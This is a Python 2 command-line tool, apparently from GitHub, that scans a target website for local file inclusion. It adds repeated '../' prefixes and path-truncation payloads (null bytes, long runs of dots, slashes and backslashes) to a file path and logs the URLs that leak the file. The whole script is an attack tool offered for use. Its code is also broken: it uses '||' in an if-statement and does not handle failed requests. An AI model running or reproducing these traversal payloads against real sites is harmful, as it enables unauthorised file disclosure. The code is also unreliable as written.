'''
@KaiyiZhang Github
'''
import sys
import urllib2
import getopt
import time

target = ''
depth = 6
file = 'robots.txt'

html = ''
prefix = ''
block  = 1
payload =[
	"",
	"%00",
	"...................................................................................................................................................................................................................................................................",
	"/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.",
	"././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././",
	"\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.",
	".\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.",
	"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\",
	"////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////"]
url = ''
keyword = 'User-agent'
force = False


def usage():
		print "LFI.Tester.py Help:"
		print "Usage: LFI.TESTER.py -t [-d] [-f] [-k] [-b] [-n]"
		print "	-t,--target The test url"
		print "	-d,--depth 	The depth for test (Default is 6)"
		print "	-f,--file The File include  (Default is robots.txt)"
		print "	-k,--keyword	the keyword for vuln check (Default is User-agent)"
		print " -b,--break-test use advanced block payload test, level(1-8) default is 1"
		print "	-n,--no-break	no break while the vuln finded"

def testurl(url):
		try:
				response = urllib2.urlopen(url)
				#print response.info()
				return response.read()
				#print html
		except:
				pass

def writefile(url):
		f = open('out.txt','a')
		t = time.strftime('%Y-%m-%d %X ',time.localtime())
		f.writelines(t + url + '\n')

try:
		if len(sys.argv) < 2:
				usage()
				sys.exit()
		opts,args = getopt.getopt(sys.argv[1:],"ht:d:f:k:b:n",["help","target=","depth=","file=","keyword=","block-test=","no-break"])
		for opt, arg in opts:
			if opt in("-h","--help"):
				usage()
				sys.exit()
			if opt in("-t","--target"):
				target = arg
				if not target.startswith('http://', 0, 7): 
						target = 'http://' + target
			if opt in("-d","--depth"):
				depth = int(arg)
				if depth < 1:
					usage()
					sys.exit()
			if opt in("-f","--file"):
				file = arg
				if file.startswith('/',0,1):
					file =file[1:]	
			if opt in("-k","--keyword"):
				keyword = arg
				#print keyword
			if opt in("-b","--block-test"):
				block = int(arg)
				if(block < 1 || block >8):
						block = 1
			if opt in("-n","--no-break"):
				force = True
except getopt.GetoptError:
		usage()
		sys.exit(2)


for i in range(0,depth+1):
		for j in range(0,block+1):
			url = target + prefix + file + payload[j]
			print "Testing: ",url
			html = testurl(url)
			if keyword in html:
					print url, " is Vulnerable"
					writefile(url)
					if not force:
						sys.exit()
					else:
						continue
			else:
					time.sleep(2)
					continue
		prefix += '../'
